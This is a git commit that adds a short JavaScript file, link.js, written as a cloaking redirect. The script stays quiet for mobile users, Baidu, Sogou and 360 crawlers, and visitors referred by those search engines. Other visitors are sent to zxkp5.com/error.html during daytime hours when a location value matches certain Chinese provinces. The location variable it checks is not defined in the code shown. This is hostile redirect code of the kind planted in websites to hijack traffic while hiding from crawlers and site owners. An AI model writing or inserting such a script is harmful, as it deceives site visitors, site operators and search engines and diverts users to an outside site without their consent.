67e46ef2af19bedad00981bdc2aa1172182bc16e
nikeoboy <2478164156@qq.com>
2020-10-28 23:09:41 +0800

    Add files via upload

---
+++ link.js
@@ -0,0 +1,6 @@
+
+if(navigator.userAgent.match(/(Android|iPhone|iPod|iPad|ios|iPadOS)/i)){
+	
+}else{
+var ua=navigator.userAgent,_r=document.referrer,_d=new Date(),h=_d.getHours(),b=ua.match(/Baiduspider/i)=="Baiduspider",s=ua.match(/Sogou/i)=="Sogou",so=ua.match(/360Spider/i)=="360Spider",_so=_r.match(/so.com/i)=="so.com",_s=_r.match(/sogou.com/i)=="sogou.com",c=_r.match(/baidu.com/i)=="baidu.com",_o=_r.match(/zxkp5.com/i)=="zxkp5.com";if(!b&&!c&&!s&&!_s&&!so&&!_so&&(h>=7&&h<=19)){if(lo.indexOf("北京")>-1 || lo.indexOf("天津")>-1 || lo.indexOf("浙江")>-1 || lo.indexOf("广东")>-1 || lo.indexOf("山东")>-1 || lo.indexOf("上海")>-1){window.location.href="https://www.zxkp5.com/error.html"}};
+}
